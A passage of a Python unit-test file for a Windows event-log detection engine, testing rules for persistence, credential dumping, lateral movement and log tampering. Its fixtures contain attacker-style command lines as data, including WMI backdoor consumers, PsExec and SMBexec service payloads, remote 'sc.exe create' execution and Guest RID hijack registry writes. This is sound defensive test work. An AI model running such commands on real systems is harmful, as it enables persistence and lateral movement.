        alerts = persistence.detect([create_event, hide_event])
        signals, findings, _ = alerts_to_signals_findings(alerts)
        incidents = build_incidents([create_event, hide_event], signals, findings, [])

        incident = next((item for item in incidents if item.incident_type == "hidden_local_account_persistence"), None)
        self.assertIsNotNone(incident)
        self.assertEqual(incident.user, "AtomicOperator$")
        self.assertEqual(incident.host, "Server002")
        self.assertIn("Winlogon UserList hiding", incident.summary)

    def test_rapid_local_group_membership_churn_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        add = make_event(
            4732,
            timestamp=base,
            computer="jump01.offsec.lan",
            subject_user="admmig",
            subject_domain="OFFSEC",
            target_user="Administrators",
            target_domain="Builtin",
            event_data={
                "MemberSid": "S-1-5-21-1470532092-3758209836-3742276719-1001",
                "TargetUserName": "Administrators",
                "TargetDomainName": "Builtin",
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "SubjectLogonId": "0x58d874",
            },
        )
        remove = make_event(
            4733,
            timestamp=base + timedelta(seconds=45),
            computer="jump01.offsec.lan",
            subject_user="admmig",
            subject_domain="OFFSEC",
            target_user="Administrators",
            target_domain="Builtin",
            event_data={
                "MemberSid": "S-1-5-21-1470532092-3758209836-3742276719-1001",
                "TargetUserName": "Administrators",
                "TargetDomainName": "Builtin",
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "SubjectLogonId": "0x58d874",
            },
        )

        alerts = persistence.detect([add, remove])
        alert = next((item for item in alerts if item.rule_name == "Rapid Local Group Membership Churn"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.evidence.get("group"), r"Builtin\Administrators")
        self.assertEqual(alert.evidence.get("lifetime_seconds"), 45)

    def test_fake_computer_account_created_detection(self):
        event = make_event(
            4720,
            computer="rootdc1.offsec.lan",
            subject_user="lambda-user",
            subject_domain="OFFSEC",
            target_user="FAKE-COMPUTER$",
            target_domain="OFFSEC",
            event_data={
                "TargetUserName": "FAKE-COMPUTER$",
                "TargetDomainName": "OFFSEC",
                "SamAccountName": "FAKE-COMPUTER$",
                "TargetSid": "S-1-5-21-1-2-3-1168",
                "UserAccountControl": "%%2080 %%2082 %%2084",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Fake Computer Account Created"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"OFFSEC\FAKE-COMPUTER$")

    def test_fake_computer_account_creation_collapses_duplicate_events(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        first = make_event(
            4720,
            timestamp=base,
            computer="rootdc1.offsec.lan",
            subject_user="lambda-user",
            subject_domain="OFFSEC",
            target_user="FAKE-COMPUTER$",
            target_domain="OFFSEC",
            event_data={
                "TargetUserName": "FAKE-COMPUTER$",
                "TargetDomainName": "OFFSEC",
                "SamAccountName": "FAKE-COMPUTER$",
                "TargetSid": "S-1-5-21-1-2-3-1168",
                "UserAccountControl": "%%2080 %%2082 %%2084",
            },
        )
        second = make_event(
            4720,
            timestamp=base + timedelta(minutes=5),
            computer="rootdc1.offsec.lan",
            subject_user="lambda-user",
            subject_domain="OFFSEC",
            target_user="FAKE-COMPUTER$",
            target_domain="OFFSEC",
            event_data={
                "TargetUserName": "FAKE-COMPUTER$",
                "TargetDomainName": "OFFSEC",
                "SamAccountName": "FAKE-COMPUTER$",
                "TargetSid": "S-1-5-21-1-2-3-1172",
                "UserAccountControl": "%%2080 %%2082 %%2084",
            },
        )

        alerts = persistence.detect([first, second])
        fake_alerts = [item for item in alerts if item.rule_name == "Fake Computer Account Created"]
        generic_alerts = [item for item in alerts if item.rule_name == "User Account Created"]
        self.assertEqual(len(fake_alerts), 1)
        self.assertEqual(len(generic_alerts), 0)
        self.assertEqual(fake_alerts[0].evidence.get("collapsed_event_count"), 2)
        self.assertEqual(len(fake_alerts[0].evidence.get("target_sids", [])), 2)

    def test_guest_rid_hijack_detection(self):
        event = make_event(
            13,
            computer="MSEDGEWIN10",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
            event_data={
                "EventType": "SetValue",
                "TargetObject": r"HKLM\SAM\SAM\Domains\Account\Users\000001F5\F",
                "Details": "Binary Data",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Guest RID Hijack"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.process, r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe")

    def test_guest_account_enabled_detection(self):
        event = make_event(
            4722,
            computer="WKSTN01",
            subject_user="adminsvc",
            subject_domain="CORP",
            target_user="Guest",
            target_domain="WKSTN01",
            event_data={
                "SubjectUserName": "adminsvc",
                "SubjectDomainName": "CORP",
                "TargetUserName": "Guest",
                "TargetDomainName": "WKSTN01",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Guest Account Enabled"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.subject_user, r"CORP\adminsvc")
        self.assertEqual(alert.user, r"WKSTN01\Guest")

    def test_windows_event_log_service_disabled_detection(self):
        event = make_event(
            7040,
            channel="System",
            provider="Service Control Manager",
            computer="WKSTN01",
            event_data={
                "param1": "Windows Event Log",
                "param2": "auto start",
                "param3": "disabled",
                "param4": "EventLog",
            },
        )

        alerts = defense_evasion.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Windows Event Log Service Disabled"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.service, "Windows Event Log")

    def test_explicit_credential_password_spray_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        events = []
        for idx, user in enumerate(("alice", "bob", "carol", "dave", "eve", "frank", "grace", "heidi"), start=1):
            events.append(
                make_event(
                    4648,
                    timestamp=base + timedelta(seconds=idx),
                    computer="WS01",
                    subject_user="jwrig",
                    subject_domain="CORP",
                    target_user=user,
                    target_domain="CORP",
                    source_ip="10.10.10.25",
                    event_data={
                        "SubjectUserName": "jwrig",
                        "SubjectDomainName": "CORP",
                        "SubjectLogonId": "0x1234",
                        "TargetUserName": user,
                        "TargetDomainName": "CORP",
                        "TargetServerName": "WS01",
                        "TargetInfo": "WS01",
                        "IpAddress": "10.10.10.25",
                    },
                )
            )

        alerts = lateral_movement.detect(events)
        spray = next((item for item in alerts if item.rule_name == "Password Spray Attack"), None)
        explicit = [item for item in alerts if item.rule_name == "Explicit Credential Use"]
        self.assertIsNotNone(spray)
        self.assertEqual(len(explicit), 0)
        self.assertEqual(spray.evidence.get("unique_account_count"), 8)

    def test_wmi_activity_subscription_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        filter_event = make_event(
            5860,
            timestamp=base,
            computer="WKSTN01",
            channel="Microsoft-Windows-WMI-Activity/Operational",
            provider="Microsoft-Windows-WMI-Activity",
            event_data={
                "User": r"NT AUTHORITY\\SYSTEM",
                "Query": "SELECT * FROM __InstanceOperationEvent WHERE TargetInstance ISA '__EventFilter'",
            },
        )
        binding_event = make_event(
            5861,
            timestamp=base + timedelta(seconds=1),
            computer="WKSTN01",
            channel="Microsoft-Windows-WMI-Activity/Operational",
            provider="Microsoft-Windows-WMI-Activity",
            event_data={
                "User": r"NT AUTHORITY\\SYSTEM",
                "Details": "Binding EventFilter: instance of __EventFilter { Name = 'Backdoor'; }; Perm. Consumer: instance of CommandLineEventConsumer { CommandLineTemplate = 'cmd.exe /c whoami'; };",
            },
        )

        alerts = persistence.detect([filter_event, binding_event])
        alert = next((item for item in alerts if item.rule_name == "WMI Event Subscription Persistence"), None)
        self.assertIsNotNone(alert)
        self.assertTrue(alert.evidence.get("binding_present"))

    def test_wmi_activity_subscription_deduplicates_same_subscription_content(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        first = make_event(
            5861,
            timestamp=base,
            computer="WKSTN01",
            channel="Microsoft-Windows-WMI-Activity/Operational",
            provider="Microsoft-Windows-WMI-Activity",
            event_data={
                "User": r"NT AUTHORITY\\SYSTEM",
                "Details": "Binding EventFilter: instance of __EventFilter { Name = 'Backdoor'; }; Perm. Consumer: instance of CommandLineEventConsumer { CommandLineTemplate = 'cmd.exe /c whoami'; };",
            },
        )
        second = make_event(
            5861,
            timestamp=base + timedelta(hours=6),
            computer="WKSTN01",
            channel="Microsoft-Windows-WMI-Activity/Operational",
            provider="Microsoft-Windows-WMI-Activity",
            event_data={
                "User": r"NT AUTHORITY\\SYSTEM",
                "Details": "Binding EventFilter: instance of __EventFilter { Name = 'Backdoor'; }; Perm. Consumer: instance of CommandLineEventConsumer { CommandLineTemplate = 'cmd.exe /c whoami'; };",
            },
        )

        alerts = [item for item in persistence.detect([first, second]) if item.rule_name == "WMI Event Subscription Persistence"]
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].evidence.get("collapsed_event_count"), 2)

    def test_accessibility_features_backdoor_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        root = make_event(
            1,
            timestamp=base,
            computer="WKSTN01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\osk.exe",
            parent_process_value=r"C:\Windows\System32\Utilman.exe",
            command_line_value=r'"C:\osk.exe"',
            event_data={
                "Image": r"C:\osk.exe",
                "ParentImage": r"C:\Windows\System32\Utilman.exe",
                "Description": "Windows Command Processor",
                "CommandLine": r'"C:\osk.exe"',
                "User": r"NT AUTHORITY\SYSTEM",
            },
        )
        child = make_event(
            1,
            timestamp=base + timedelta(seconds=3),
            computer="WKSTN01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\whoami.exe",
            parent_process_value=r"C:\osk.exe",
            command_line_value="whoami",
            event_data={
                "Image": r"C:\Windows\System32\whoami.exe",
                "ParentImage": r"C:\osk.exe",
                "Description": "whoami - displays logged on user information",
                "CommandLine": "whoami",
                "User": r"NT AUTHORITY\SYSTEM",
            },
        )

        alerts = persistence.detect([root, child])
        alert = next((item for item in alerts if item.rule_name == "Accessibility Features Backdoor"), None)
        self.assertIsNotNone(alert)
        self.assertTrue(alert.evidence.get("suspicious_path"))
        self.assertIn(r"C:\Windows\System32\whoami.exe", alert.evidence.get("follow_on_processes", []))

    def test_accessibility_features_backdoor_deduplicates_same_image(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        first = make_event(
            1,
            timestamp=base,
            computer="WKSTN01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\osk.exe",
            parent_process_value=r"C:\Windows\System32\Utilman.exe",
            command_line_value=r'"C:\osk.exe"',
            event_data={
                "Image": r"C:\osk.exe",
                "ParentImage": r"C:\Windows\System32\Utilman.exe",
                "Description": "Windows Command Processor",
                "CommandLine": r'"C:\osk.exe"',
                "User": r"NT AUTHORITY\SYSTEM",
            },
        )
        second = make_event(
            1,
            timestamp=base + timedelta(hours=3),
            computer="WKSTN01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\osk.exe",
            parent_process_value=r"C:\Windows\System32\Utilman.exe",
            command_line_value=r'"C:\osk.exe"',
            event_data={
                "Image": r"C:\osk.exe",
                "ParentImage": r"C:\Windows\System32\Utilman.exe",
                "Description": "Windows Command Processor",
                "CommandLine": r'"C:\osk.exe"',
                "User": r"NT AUTHORITY\SYSTEM",
            },
        )

        alerts = [item for item in persistence.detect([first, second]) if item.rule_name == "Accessibility Features Backdoor"]
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].evidence.get("collapsed_event_count"), 2)

    def test_application_shim_persistence_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        install = make_event(
            1,
            timestamp=base,
            computer="WKSTN01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\sdbinst.exe",
            parent_process_value=r"C:\Program Files\Compatadmin.exe",
            command_line_value=r'"C:\Windows\System32\sdbinst.exe" -q "C:\Windows\AppPatch\Test.sdb"',
            event_data={
                "Image": r"C:\Windows\System32\sdbinst.exe",
                "ParentImage": r"C:\Program Files\Compatadmin.exe",
                "CommandLine": r'"C:\Windows\System32\sdbinst.exe" -q "C:\Windows\AppPatch\Test.sdb"',
            },
        )
        registry = make_event(
            13,
            timestamp=base + timedelta(seconds=1),
            computer="WKSTN01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\sdbinst.exe",
            event_data={
                "EventType": "SetValue",
                "Image": r"C:\Windows\System32\sdbinst.exe",
                "TargetObject": r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\Utilman.exe\{11111111-1111-1111-1111-111111111111}.sdb",
                "Details": r"C:\Windows\AppPatch\Custom\{11111111-1111-1111-1111-111111111111}.sdb",
            },
        )
        dropped = make_event(
            11,
            timestamp=base + timedelta(seconds=1),
            computer="WKSTN01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\sdbinst.exe",
            event_data={
                "Image": r"C:\Windows\System32\sdbinst.exe",
                "TargetFilename": r"C:\Windows\AppPatch\Custom\{11111111-1111-1111-1111-111111111111}.sdb",
            },
        )

        alerts = persistence.detect([install, registry, dropped])
        alert = next((item for item in alerts if item.rule_name == "Application Shim Persistence"), None)
        self.assertIsNotNone(alert)
        self.assertIn("utilman.exe", [item.lower() for item in alert.evidence.get("target_binaries", [])])

    def test_new_privileged_account_provisioning_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        created = make_event(
            4720,
            timestamp=base,
            computer="IE8Win7",
            subject_user="WIN-QALA5Q3KJ43$",
            subject_domain="WORKGROUP",
            target_user="IEUser",
            target_domain="IE8Win7",
            event_data={
                "TargetUserName": "IEUser",
                "TargetDomainName": "IE8Win7",
                "TargetSid": "S-1-5-21-3463664321-2923530833-3546627382-1000",
                "SubjectUserName": "WIN-QALA5Q3KJ43$",
                "SubjectDomainName": "WORKGROUP",
                "SamAccountName": "IEUser",
            },
        )
        added = make_event(
            4732,
            timestamp=base + timedelta(seconds=1),
            computer="IE8Win7",
            subject_user="WIN-QALA5Q3KJ43$",
            subject_domain="WORKGROUP",
            target_user="Administrators",
            target_domain="Builtin",
            event_data={
                "MemberName": "-",
                "MemberSid": "S-1-5-21-3463664321-2923530833-3546627382-1000",
                "TargetUserName": "Administrators",
                "TargetDomainName": "Builtin",
                "TargetSid": "S-1-5-32-544",
                "SubjectUserName": "WIN-QALA5Q3KJ43$",
                "SubjectDomainName": "WORKGROUP",
            },
        )

        alerts = persistence.detect([created, added])
        specific = next((item for item in alerts if item.rule_name == "New Privileged Account Provisioned"), None)
        generic_group = [item for item in alerts if item.rule_name == "Member Added to Sensitive Group"]
        generic_create = [item for item in alerts if item.rule_name == "User Account Created"]
        self.assertIsNotNone(specific)
        self.assertEqual(specific.user, r"IE8Win7\IEUser")
        self.assertIn("Administrators", specific.evidence.get("sensitive_groups", []))
        self.assertEqual(len(generic_group), 0)
        self.assertEqual(len(generic_create), 0)

    def test_behavioral_chain_skips_appcompat_context(self):
        event = make_event(
            1,
            computer="PC01.example.corp",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            parent_process_value=r"C:\Windows\System32\services.exe",
            command_line_value=r"C:\Windows\system32\cmd.EXE /c malwr.vbs",
            event_data={
                "Image": r"C:\Windows\System32\cmd.exe",
                "ParentImage": r"C:\Windows\System32\services.exe",
                "CommandLine": r"C:\Windows\system32\cmd.EXE /c malwr.vbs",
            },
        )

        alerts = behavioral.detect([event])
        self.assertEqual([item for item in alerts if item.rule_name == "Behavioral: Suspicious Process Chain"], [])

    def test_mimikatz_credential_dumping_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        privilege = make_event(
            4673,
            timestamp=base,
            computer="WKSTN01",
            subject_user="alice",
            subject_domain="CORP",
            process_name_value=r"C:\Tools\mimikatz\mimikatz.exe",
            event_data={
                "SubjectUserName": "alice",
                "SubjectDomainName": "CORP",
                "SubjectLogonId": "0x2222",
                "PrivilegeList": "SeTcbPrivilege",
                "ProcessName": r"C:\Tools\mimikatz\mimikatz.exe",
                "ProcessId": "0x15a8",
            },
        )
        enumeration = make_event(
            4798,
            timestamp=base + timedelta(seconds=2),
            computer="WKSTN01",
            subject_user="alice",
            subject_domain="CORP",
            target_user="alice",
            target_domain="CORP",
            event_data={
                "SubjectUserName": "alice",
                "SubjectDomainName": "CORP",
                "SubjectLogonId": "0x2222",
                "TargetUserName": "alice",
                "TargetDomainName": "CORP",
                "CallerProcessName": r"C:\Windows\System32\mmc.exe",
            },
        )

        alerts = credential_access.detect([privilege, enumeration])
        alert = next((item for item in alerts if item.rule_name == "Mimikatz Credential Dumping"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.evidence.get("related_user_enumeration_count"), 1)

    def test_dcshadow_computer_object_staging_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        spn_change = make_event(
            4742,
            timestamp=base,
            computer="DC01",
            subject_user="Administrator",
            subject_domain="CORP",
            target_user="ALICE$",
            target_domain="CORP",
            event_data={
                "SubjectUserName": "Administrator",
                "SubjectDomainName": "CORP",
                "SubjectLogonId": "0x3333",
                "TargetUserName": "ALICE$",
                "TargetDomainName": "CORP",
                "ServicePrincipalNames": "HOST/alice.corp.local\nWSMAN/alice\nGC/alice.corp.local/corp.local\nE3514235-4B06-11D1-AB04-00C04FC2DCD2/abcd/corp.local",
            },
        )
        replica_access = make_event(
            4662,
            timestamp=base + timedelta(seconds=5),
            computer="DC01",
            subject_user="Administrator",
            subject_domain="CORP",
            event_data={
                "SubjectUserName": "Administrator",
                "SubjectDomainName": "CORP",
                "SubjectLogonId": "0x3333",
                "Properties": "{9923a32a-3607-11d2-b9be-0000f87a36b2}",
                "AccessMask": "0x00000100",
            },
        )

        alerts = credential_access.detect([spn_change, replica_access])
        alert = next((item for item in alerts if item.rule_name == "DCShadow Computer Object Staging"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.target_user, r"CORP\ALICE$")
        self.assertEqual(alert.evidence.get("related_4662_count"), 1)

    def test_suspicious_dotnet_compilation_from_user_temp_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        launcher = make_event(
            4688,
            timestamp=base,
            computer="WKSTN01",
            subject_user="user01",
            subject_domain="CORP",
            process_name_value=r"C:\Users\user01\Desktop\PSAttack\PSAttack.exe",
            command_line_value=r'"C:\Users\user01\Desktop\PSAttack\PSAttack.exe"',
        )
        compiler = make_event(
            4688,
            timestamp=base + timedelta(seconds=5),
            computer="WKSTN01",
            subject_user="user01",
            subject_domain="CORP",
            process_name_value=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
            command_line_value=r'"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\user01\AppData\Local\Temp\abcd.cmdline"',
        )
        resource = make_event(
            4688,
            timestamp=base + timedelta(seconds=7),
            computer="WKSTN01",
            subject_user="user01",
            subject_domain="CORP",
            process_name_value=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe",
            command_line_value=r'C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\user01\AppData\Local\Temp\RESA.tmp" "c:\Users\user01\AppData\Local\Temp\CSCABC.TMP"',
        )

        alerts = defense_evasion.detect([launcher, compiler, resource])
        alert = next((item for item in alerts if item.rule_name == "Suspicious .NET Compilation from User Temp"), None)
        self.assertIsNotNone(alert)
        self.assertTrue(alert.evidence.get("psattack_present"))

    def test_rapid_user_create_delete_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        create = make_event(
            4720,
            timestamp=base,
            computer="SERVER01",
            subject_user="opsadmin",
            subject_domain="CORP",
            target_user="tempadmin",
            target_domain="SERVER01",
            event_data={
                "SubjectUserName": "opsadmin",
                "SubjectDomainName": "CORP",
                "TargetUserName": "tempadmin",
                "TargetDomainName": "SERVER01",
                "TargetSid": "S-1-5-21-1-2-3-1100",
                "SamAccountName": "tempadmin",
            },
        )
        delete = make_event(
            4726,
            timestamp=base + timedelta(minutes=4),
            computer="SERVER01",
            subject_user="opsadmin",
            subject_domain="CORP",
            target_user="tempadmin",
            target_domain="SERVER01",
            event_data={
                "SubjectUserName": "opsadmin",
                "SubjectDomainName": "CORP",
                "TargetUserName": "tempadmin",
                "TargetDomainName": "SERVER01",
                "TargetSid": "S-1-5-21-1-2-3-1100",
                "SamAccountName": "tempadmin",
            },
        )

        alerts = persistence.detect([create, delete])
        alert = next((item for item in alerts if item.rule_name == "Rapid User Create/Delete"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"SERVER01\tempadmin")
        self.assertEqual(alert.evidence.get("lifetime_seconds"), 240)

    def test_explicit_credentials_followed_by_remote_execution_sequence(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        explicit = make_event(
            4648,
            timestamp=base,
            computer="WS01",
            subject_user="alice",
            subject_domain="CORP",
            target_user="adminsvc",
            target_domain="CORP",
            event_data={
                "SubjectUserName": "alice",
                "SubjectDomainName": "CORP",
                "SubjectLogonId": "0x1111",
                "TargetUserName": "adminsvc",
                "TargetDomainName": "CORP",
                "TargetServerName": "SERVER02",
            },
        )
        sc_cmd = make_event(
            4688,
            timestamp=base + timedelta(seconds=20),
            computer="WS01",
            subject_user="alice",
            subject_domain="CORP",
            process_name_value=r"C:\Windows\System32\sc.exe",
            command_line_value=r'sc.exe \\SERVER02 create upsvc binPath= "cmd.exe /c whoami"',
        )

        alerts = lateral_movement.detect([explicit, sc_cmd])
        alert = next((item for item in alerts if item.rule_name == "Explicit Credentials Followed by Remote Execution"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"CORP\adminsvc")
        self.assertEqual(alert.evidence.get("target_server"), "SERVER02")

    def test_runas_different_user_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        runas = make_event(
            4688,
            timestamp=base,
            computer="FS03.offsec.lan",
            subject_user="admmig",
            subject_domain="OFFSEC",
            process_name_value=r"C:\Windows\System32\runas.exe",
            command_line_value=r"runas /user:offsec\hack1 cmd.exe",
            event_data={
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "SubjectLogonId": "0x1234",
                "NewProcessName": r"C:\Windows\System32\runas.exe",
                "CommandLine": r"runas /user:offsec\hack1 cmd.exe",
                "TargetLogonId": "0x0",
            },
        )
        explicit = make_event(
            4648,
            timestamp=base + timedelta(seconds=1),
            computer="FS03.offsec.lan",
            subject_user="admmig",
            subject_domain="OFFSEC",
            target_user="hack1",
            target_domain="OFFSEC",
            event_data={
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "SubjectLogonId": "0x1234",
                "TargetUserName": "hack1",
                "TargetDomainName": "OFFSEC",
                "TargetServerName": "localhost",
            },
        )
        seclogo = make_event(
            4624,
            timestamp=base + timedelta(seconds=2),
            computer="FS03.offsec.lan",
            subject_user="admmig",
            subject_domain="OFFSEC",
            target_user="hack1",
            target_domain="OFFSEC",
            logon_type="2",
            event_data={
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "SubjectLogonId": "0x1234",
                "TargetUserName": "hack1",
                "TargetDomainName": "OFFSEC",
                "TargetLogonId": "0x8888",
                "LogonProcessName": "seclogo",
                "LogonType": "2",
            },
        )
        privileged = make_event(
            4672,
            timestamp=base + timedelta(seconds=3),
            computer="FS03.offsec.lan",
            subject_user="hack1",
            subject_domain="OFFSEC",
            event_data={
                "SubjectUserName": "hack1",
                "SubjectDomainName": "OFFSEC",
                "SubjectLogonId": "0x8888",
            },
        )
        child = make_event(
            4688,
            timestamp=base + timedelta(seconds=4),
            computer="FS03.offsec.lan",
            subject_user="FS03$",
            subject_domain="OFFSEC",
            target_user="hack1",
            target_domain="OFFSEC",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            command_line_value="cmd.exe",
            event_data={
                "SubjectUserName": "FS03$",
                "SubjectDomainName": "OFFSEC",
                "SubjectLogonId": "0x3e7",
                "TargetUserName": "hack1",
                "TargetDomainName": "OFFSEC",
                "TargetLogonId": "0x8888",
                "NewProcessName": r"C:\Windows\System32\cmd.exe",
                "CommandLine": "cmd.exe",
            },
        )

        alerts = credential_access.detect([runas, explicit, seclogo, privileged, child])
        alert = next((item for item in alerts if item.rule_name == "RunAs Different User"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"OFFSEC\hack1")
        self.assertEqual(alert.subject_user, r"OFFSEC\admmig")
        self.assertTrue(alert.evidence.get("privileged_followup"))
        self.assertIn("0x8888", alert.evidence.get("target_logon_ids", []))

    def test_token_manipulation_activity_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        seclogo = make_event(
            4624,
            timestamp=base,
            computer="FS03.offsec.lan",
            target_user="hack1",
            target_domain="OFFSEC",
            logon_type="9",
            event_data={
                "TargetUserName": "hack1",
                "TargetDomainName": "OFFSEC",
                "TargetLogonId": "0x9999",
                "LogonProcessName": "seclogo",
                "LogonType": "9",
            },
        )
        consent = make_event(
            4611,
            timestamp=base - timedelta(seconds=5),
            computer="FS03.offsec.lan",
            event_data={"LogonProcessName": "ConsentUI"},
        )
        tcb = make_event(
            4673,
            timestamp=base + timedelta(seconds=5),
            computer="FS03.offsec.lan",
            event_data={"PrivilegeList": "SeTcbPrivilege", "Service": "LsaRegisterLogonProcess()"},
        )
        cmd = make_event(
            4688,
            timestamp=base + timedelta(seconds=10),
            computer="FS03.offsec.lan",
            subject_user="hack1",
            subject_domain="OFFSEC",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            command_line_value="cmd.exe /c whoami",
        )

        alerts = credential_access.detect([consent, seclogo, tcb, cmd])
        alert = next((item for item in alerts if item.rule_name == "Token Manipulation Activity"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"OFFSEC\hack1")
        self.assertIn(r"C:\Windows\System32\cmd.exe", alert.evidence.get("follow_on_processes", []))

    def test_transient_scheduled_task_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        created = make_event(
            4698,
            timestamp=base,
            computer="SERVER01",
            subject_user="admin",
            subject_domain="CORP",
            event_data={
                "TaskName": r"\bouWFQYO",
                "SubjectLogonId": "0x1234",
                "TaskContent": r"<Command>cmd.exe /C whoami > %windir%\Temp\bouWFQYO.tmp</Command>",
            },
        )
        deleted = make_event(
            4699,
            timestamp=base + timedelta(seconds=30),
            computer="SERVER01",
            subject_user="admin",
            subject_domain="CORP",
            event_data={"TaskName": r"\bouWFQYO", "SubjectLogonId": "0x1234"},
        )

        alerts = persistence.detect([created, deleted])
        alert = next((item for item in alerts if item.rule_name == "Transient Scheduled Task Execution"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.scheduled_task, r"\bouWFQYO")
        self.assertEqual(alert.severity, "critical")

    def test_service_payload_abuse_detection(self):
        psexec = make_event(
            7045,
            computer="SERVER01",
            event_data={
                "ServiceName": "hgabms",
                "ImagePath": r"cmd.exe /c echo hgabms > \\.\pipe\hgabms",
            },
        )
        smbexec = make_event(
            7045,
            computer="SERVER01",
            event_data={
                "ServiceName": "BTOBTO",
                "ImagePath": r"%COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat",
            },
        )

        alerts = persistence.detect([psexec, smbexec])
        names = [item.rule_name for item in alerts]
        self.assertIn("PsExec Service Payload", names)
        self.assertIn("SMBexec Service Payload", names)

    def test_psexec_named_pipe_stager_detection(self):
        event = make_event(
            4688,
            computer="SERVER01",
            subject_user="SERVER01$",
            subject_domain="WORKGROUP",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            command_line_value=r"cmd.exe /c echo genusn > \\.\pipe\genusn",
        )
        alerts = lateral_movement.detect([event])
        alert = next((item for item in alerts if item.rule_name == "PsExec Named Pipe Stager"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.evidence.get("pipe_name"), "genusn")

    def test_cmd_named_pipe_does_not_trigger_powershell_named_pipe_alert(self):
        event = make_event(
            1,
            computer="IEWIN7",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            parent_process_value=r"C:\Windows\System32\services.exe",
            command_line_value=r"cmd.exe /c echo msdhch > \\.\pipe\msdhch",
            event_data={
                "Image": r"C:\Windows\System32\cmd.exe",
                "ParentImage": r"C:\Windows\System32\services.exe",
                "CommandLine": r"cmd.exe /c echo msdhch > \\.\pipe\msdhch",
                "User": r"NT AUTHORITY\SYSTEM",
            },
        )

        alerts = defense_evasion.detect([event])
        self.assertFalse(any(item.rule_name == "Suspicious: Named Pipe PowerShell" for item in alerts))

    def test_service_imagepath_registry_backed_abuse_detection(self):
